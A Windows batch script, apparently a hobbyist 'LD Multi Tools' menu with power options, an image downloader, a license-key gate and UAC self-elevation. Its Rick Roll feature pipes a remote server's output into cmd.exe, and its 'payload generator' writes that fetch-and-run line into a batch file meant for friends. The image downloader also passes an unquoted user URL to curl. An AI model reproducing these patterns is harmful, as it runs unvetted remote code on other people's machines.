@echo off
setlocal enabledelayedexpansion

set "ver=v2.2"
title LD Multi Tools %ver%
chcp 65001 >nul
mode con:cols=160 lines=21
:admin
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
	
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

if not exist license.ld call :auth
goto :menu

:auth
cls
mode con:cols=160 lines=25
echo [7m[91m                                                      THE LICENSE FILE IS MISSING, PLEASE ENTER A NEW LICENSE KEY!!!!!!                                               [0m
echo [7m[91m                                                          Contact [0m[7m[92m[4m[1mgengar_backup25[0m[7m[91m on discord for a new license!                                                  [0m
echo [7m[91m                                                                                                                                                                [0m    
set /p key="[91m                                                     Key: [0m"
if "%key%"=="LDMT_LKey%ver%" (
    echo Activated > license.ld
    goto authsuccess
) else (
    echo [7m[91m                                                                         KEY INVALID!!!!!!                                                                            [0m
    echo [7m[91m                                                          Contact [0m[7m[92m[4m[1mgengar_backup25[0m[7m[91m on discord for the key!                                                        [0m
    echo [7m[91m                                                                                                                                                                [0m
    goto auth
)

:authsuccess
cls
echo [92mAuthentication Successful![0m
pause >nul
goto :menu

:menu
mode con:cols=160 lines=35
cls
call :banner
echo [94m                             ╔═ [1] Power Options (Shutdown, Restart, etc...)[0m
echo [94m                             ║[0m
echo [92m                             ╠═ [2] Image Downloader (Download image from links, url)[0m
echo [92m                             ║[0m
echo [93m                             ╠═ [3] ASCII Rick Roll + Payload Generator (Rick Roll your friends in the coolest way)[0m
echo [93m                             ║[0m
echo [95m                             ╠═ [4] Boot to BIOS (Reboot and access BIOS settings)[0m
echo [95m                             ║[0m
echo [96m                             ╠═ [5] Patch Notes (View the full patch notes for v2 - v2.6)[0m
echo [96m                             ║[0m
echo [91m                             ╠═ [6] Exit[0m
echo [91m                             ║[0m
echo [0m
set /p option="[92m.%BS%                           ╚════════════════> Choose an option: [0m"
goto :%option%

:1
cls
call :banner
echo [92m                             ╔═ [1] Shutdown [0m
echo [92m                             ║[0m
echo [33m                             ╠═ [2] Restart[0m
echo [33m                             ║[0m
echo [94m                             ╠═ [3] Hibernate[0m
echo [94m                             ║[0m
echo [96m                             ╠═ [4] Log Off[0m
echo [96m                             ║[0m
echo [35m                             ╠═ [5] Sleep[0m
echo [35m                             ║[0m
set /p choice="[92m.%BS%                           ╚════════════════> Choose an option: [0m"
if "%choice%"=="1" shutdown /s /t 0
if "%choice%"=="2" shutdown /r /t 0
if "%choice%"=="3" shutdown /h
if "%choice%"=="4" shutdown /l
if "%choice%"=="5" rundll32.exe powrprof.dll,SetSuspendState 0,1,0
goto :menu

:2
cls
call :banner
set /p url="[92m.%BS%                           ╚════════════════> Enter image url/link: [0m"
echo [92mDownloading image...[0m
curl -s -o "%~dp0downloaded_image.png" %url%
cls 
call :banner
echo [92m                                        Image downloaded successfully as downloaded_image.png![0m
pause >nul
goto :menu

:3
cls
call :banner
echo [92m                             ╔═ [1] Display Rick Roll Now[0m
echo [92m                             ║[0m
echo [93m                             ╠═ [2] Create Payload Batch File[0m
echo [93m                             ║[0m
set /p action="[92m.%BS%                           ╚════════════════> Choose an action: [0m"
goto :rickroll_action_%action%

:rickroll_action_1
cls
call :banner
echo [92m                             ╔═ [1] ASCII.live (Smoother Animation - Less Quality)[0m
echo [92m                             ║[0m
echo [33m                             ╠═ [2] Rick.jachan.dev (More Quality - Laggier)[0m
echo [33m                             ║[0m
set /p server="[92m.%BS%                           ╚════════════════> Choose an ASCII server: [0m"
goto :fetch_ascii_server_%server%

:rickroll_action_2
cls
call :banner
echo [92m                             ╔═ [1] ASCII.live (Smoother Animation - Less Quality)[0m
echo [92m                             ║[0m
echo [33m                             ╠═ [2] Rick.jachan.dev (More Quality - Laggier)[0m
echo [33m                             ║[0m
set /p server="[92m.%BS%                           ╚════════════════> Choose an ASCII server for payload: [0m"
goto :payload_ascii_server_%server%

:fetch_ascii_server_1
cls
call :banner
set /p color="[92m.%BS%                           ╚════════════════> Type in a color code: [0m"
echo [92mFetching Rick Roll...[0m
color %color%
curl http://ascii.live/can-you-hear-me
echo [92mRick Roll displayed![0m
pause >nul
goto :menu

:fetch_ascii_server_2
cls
call :banner
set /p sound="[92m.%BS%                           ╚════════════════> Enable Sounds (yes/no): [0m"
if /i "%sound%"=="yes" (
    echo [92mFetching Rick Roll with sound...[0m
    curl -sN http://rick.jachan.dev | cmd.exe
) else (
    echo [92mFetching Rick Roll without sound...[0m
    curl -sN http://rick.jachan.dev
)
echo [92mRick Roll displayed![0m
pause >nul
goto :menu

:payload_ascii_server_1
cls
call :banner
set /p color="[92m.%BS%                           ╚════════════════> Type in a color code for payload: [0m"
(
    echo @echo off
    echo color %color%
    echo curl http://ascii.live/can-you-hear-me
    echo echo Rick Roll displayed!
    echo pause >nul
) > "%~dp0rickroll_payload.bat"
echo Payload batch file created as 'rickroll_payload.bat'![0m
pause >nul
goto :menu

:payload_ascii_server_2
cls
call :banner
set /p sound="[92m.%BS%                           ╚════════════════> Enable Sounds (yes/no) for payload: [0m"
(
    echo @echo off
    if /i "%sound%"=="yes" (
        echo curl -sN http://rick.jachan.dev | cmd.exe
        echo echo Rick Roll displayed with sound!
    ) else (
        echo curl -sN http://rick.jachan.dev
        echo echo Rick Roll displayed without sound!
    )
    echo pause >nul
) > "%~dp0rickroll_payload.bat"
echo Payload batch file created as 'rickroll_payload.bat'![0m
pause >nul
goto :menu

:4
cls
call :banner
echo [91mRebooting to BIOS...[0m
shutdown /r /fw /t 0
goto :menu

:5
cls
call :banner
echo [92m                             ╔═ PATCH NOTES - VERSION %ver% [0m
echo [92m                             ║[0m
echo [93m                             ╠═ [2.0] Added multiple power options including Log Off and Sleep.[0m
echo [93m                             ║[0m
echo [94m                             ╠═ [2.0] Introduced Boot to BIOS option in the main menu.[0m
echo [94m                             ║[0m
echo [95m                             ╠═ [2.1] Fixed issue with ASCII Rick Roll not displaying correctly.[0m
echo [95m                             ║[0m
echo [96m                             ╠═ [2.1] Updated the ASCII Rick Roll fetch to ensure correct display.[0m
echo [95m                             ║[0m
echo [95m                             ╠═ [2.1] Temporarily removed the payload generation function for maintenance.[0m
echo [94m                             ║[0m
echo [94m                             ╠═ [2.2] Added back payload generation function[0m
echo [94m                             ║[0m
echo [93m                             ╠═ [2.2] Slightly rewritten to optimize (17.5KB -> 11.8 KB).[0m
echo [93m                             ║[0m
echo [91m                             ╠═ [All] Minor UI improvements and bug fixes.[0m
echo [96m                             ║[0m
echo [91m                             ╚═ [All] Added new banner info.[0m
pause >nul
goto :menu

:banner
echo.
echo.
echo   [91m         ▄█       ████████▄[0m          [91m           ▄▄▄▄███▄▄▄▄   ███    █▄   ▄█           ███      ▄█           ███      ▄██████▄   ▄██████▄   ▄█[0m       
echo   [91m         ███       ███   ▀███[0m        [91m         ▄██▀▀▀███▀▀▀██▄ ███    ███ ███       ▀█████████▄ ███       ▀█████████▄ ███    ███ ███    ███ ███[0m  
echo   [91m         ███       ███    ███[0m        [38;5;208m         ███   ███   ███ ███    ███ ███          ▀███▀▀██ ███▌         ▀███▀▀██ ███    ███ ███    ███ ███[0m       
echo   [93m         ███       ███    ███[0m        [38;5;208m         ███   ███   ███ ███    ███ ███           ███   ▀ ███▌          ███   ▀ ███    ███ ███    ███ ███[0m       
echo   [93m         ███       ███    ███[0m        [93m         ███   ███   ███ ███    ███ ███           ███     ███▌          ███     ███    ███ ███    ███ ███[0m       
echo   [93m         ███       ███    ███[0m        [38;5;208m         ███   ███   ███ ███    ███ ███           ███     ███           ███     ███    ███ ███    ███ ███[0m       
echo   [93m         ███       ███    ███[0m        [38;5;208m         ███   ███   ███ ███    ███ ███           ███     ███           ███     ███    ███ ███    ███ ███[0m              
echo   [91m         ███▌    ▄ ███   ▄███[0m        [91m         ███   ███   ███ ███    ███ ███▌    ▄     ███     ███           ███     ███    ███ ███    ███ ███▌    ▄[0m 
echo   [91m         █████▄▄██ ████████▀[0m         [91m          ▀█   ███   █▀  ████████▀  █████▄▄██    ▄████▀   █▀           ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██[0m 
echo   [91m                 ▀                                                               ▀                                                                 ▀         
echo.
echo 								[7m[91m VERSION 2.2 IS OUT!!!!!!!!! 	[0m
echo.
